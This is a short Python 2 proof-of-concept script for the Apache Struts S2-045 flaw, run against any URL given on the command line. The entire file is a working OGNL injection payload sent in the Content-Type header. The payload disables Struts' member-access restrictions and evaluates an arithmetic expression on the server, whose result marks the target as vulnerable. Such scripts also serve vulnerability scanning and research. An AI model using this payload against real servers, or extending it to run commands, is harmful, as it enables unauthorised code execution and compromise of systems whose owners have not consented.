import requests

import sys
 

def poc(url):

    payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}"

    headers = {}

    headers["Content-Type"] = payload

    r = requests.get(url, headers=headers)

    if "105059592" in r.content:

        return True
 

    return False



if __name__ == '__main__':

    if len(sys.argv) == 1:

        print "python s2-045.py target"

        sys.exit()

    if poc(sys.argv[1]):

        print "vulnerable"

    else:

        print "not vulnerable"